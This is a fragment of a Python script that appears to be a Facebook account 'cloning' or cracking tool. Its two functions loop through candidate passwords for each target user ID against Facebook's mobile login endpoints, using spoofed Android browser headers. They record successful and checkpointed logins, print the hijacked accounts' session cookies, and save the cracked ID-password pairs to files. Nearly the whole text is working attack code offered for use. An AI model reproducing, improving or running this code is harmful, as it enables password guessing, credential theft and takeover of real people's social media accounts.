                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\x1b[10;92m┏━\x1b[10;97m=============================================')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;96mCLONING COMPLETE BRO-!✅ :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCOMPLETE YOUR TOTAL OK IDz \x1b[10;91m•\x1b[10;92m :\033[0;92m %s '%(ok))
    print('\x1b[10;92m┣━\x1b[10;97m=============================================')
    woi = input('\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;91mCLICK ENTER TO EXIT')
    os.system("python nono.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[10;97m{bo}[Tutul•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\x1b[10;92m "),
    sys.stdout.flush()
    ua = random.choice(ugen) 
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({
            'Host': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2.5687501430511475',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X6812"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'viewport-width': '980'})
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[10;95m[Tutul•Cp] {idf} • {pw}')
                open('CP❌/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                bo = random.choice([m,k,h,b,u,x])
                print(f'\r\x1b[10;92m[Tutul•Ok💚] {idf} • {pw} \x1b[10;91m•> \x1b[10;96m{tutulx(idf)}\n\x1b[10;93m[🌺] = COOKIES • {kuki}\n ')
                open('OK🖤-TUTUL/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Tutul-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({'Host': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2.5687501430511475',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X6812"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'viewport-width': '980'})
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[{time.strftime("%H:%M")}•Tutul-Cp] ({idf} • {pw}')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'''\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;92m[Tutul•Ok] {idf} • {pw}''')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
menu()